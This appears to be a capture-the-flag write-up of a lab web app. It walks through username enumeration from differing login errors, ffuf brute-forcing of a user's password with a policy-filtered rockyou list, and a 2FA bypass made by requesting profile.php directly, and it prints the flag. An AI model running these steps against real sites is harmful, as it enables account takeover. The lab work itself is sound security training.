# Background:

SecureMint Innovations has hired us to test their new authentication mechanism of their web application.

One of the updates is a new password policy that was designed to improve account security.



# Recon:

The reconnaissance phase is straightforward, simply go to the login page:

	http://154.57.164.82:31187/login.php
<p align="center">
	<img width="860" height="665" alt="ba-login" src="https://github.com/user-attachments/assets/be3ab553-144d-41dc-8708-c0b241a3d371" />
</p>

Lets try the default credentials:

	Username: admin
	Password: admin

<p align="center">
	<img width="859" height="725" alt="ba-login-unknown" src="https://github.com/user-attachments/assets/5bbcf9e4-b1c5-42f0-a9c2-e7f56f156fce" />
</p>

- This didn't work, we got the error message:

		Unknown username or password.

However, notice the option: "Register a new account"

- If you follow the link and attempt, and fail to create an account the site will provide us with valuable information regarding the account passwords:

<p align="center">
	<img width="861" height="852" alt="ba-register" src="https://github.com/user-attachments/assets/e225cdf5-4805-48fc-bbd3-19eb56e08a92" />
</p>

- As we can see the site employs several useful password restrictions, although requiring a password length to be exactly 12 characters would make brute forcing significantly easier.



# Attack:

Let's start by creating an account:

	Username: admin
	Password: Playstation3

If we login with our new account, it takes us to profile.php, which unfortunately doesn't reveal anything that we can use.

<p align="center">
	<img width="860" height="445" alt="ba-profile" src="https://github.com/user-attachments/assets/37cf5ef3-26c9-4a01-a91e-c6b90e2703f3" />
</p>

If we go back to the login, lets see what happens if we login with the wrong password:

<p align="center">
	<img width="860" height="735" alt="ba-login-invalid" src="https://github.com/user-attachments/assets/e00071c5-470c-40aa-98a3-d9d46b681bca" />
</p>

The error message is different, lets see if we can use this to discover any other accounts:

	ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" \
		-u "http://154.57.164.82:31187/login.php" \
		-d "username=FUZZ&password=Playstation3" \
		-fr "Unknown username or password." -fc 403 \
		-w /usr/share/seclists/Usernames/Names/names.txt

- This reveals a username! Now lets see if we can brute force their password.
	
		admin            [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 224ms]
		gladys           [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 188ms]


First, well simplify the rockyou wordlist to fit the password restrictions

	cat /tmp/rockyou.txt | grep '[[:upper:]]' | grep '[[:lower:]]' \
		| grep '[[:digit:]]' | grep -v '[[:punct:]]' | grep -x '.\{12\}' > rockyou.txt


Now we'll use our custom wordlist to brute force gladys' password:

	ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" \
		-u "http://154.57.164.82:31187/login.php" \
		-d "username=gladys&password=FUZZ" \
		-fr "Invalid credentials." -fc 403 \
		-w rockyou.txt

- The fuzzing reveals that gladys' password is dWinaldasD13.

		dWinaldasD13     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 161ms]


If we login with the credentials, gladys and dWinaldasD13, then we will be prompted with a 2 factor authentication page. And if we get the code wrong 3 times we'll be prompted to login again, which makes brute forcing with ffuf impractical. So lets see if we can circumvent this.

Lets move to Burp Suite an inspect the request that succeeds the login request.

	GET /2fa.php HTTP/1.1

- Its a GET request that is sending us to the 2fa page.


Recall that if we logged in with the account we created, it takes us to profile.php.

- What happens if modify the request to tell the server to go to profile.php?

		GET /profile.php HTTP/1.1


Well the responce shows that we were able to bypass the authentication and login as gladys, and that the flag is located in the html:

	<div class="heading">
		  <h1 class="display-5 title">Welcome gladys!</h1>
		  <br />
		  <div class="cards">

		    HTB{d86115e037388d0fa29280b737fd9171}
	</div>
	</div>


Additionally, after bypassing 2fa.php, we can use curl to get the flag:

	curl -s "http://154.57.164.82:31187/profile.php" \
		-H "Cookie: PHPSESSID=<cookie>" \
		-d "username=gladys&password=dWinaldasD13"

- Which the server responds with:

		<div class="heading">
				<h1 class="display-5 title">Welcome gladys!</h1>
				<br />
				<div class="cards">

				  HTB{d86115e037388d0fa29280b737fd9171}
		</div>
		</div>

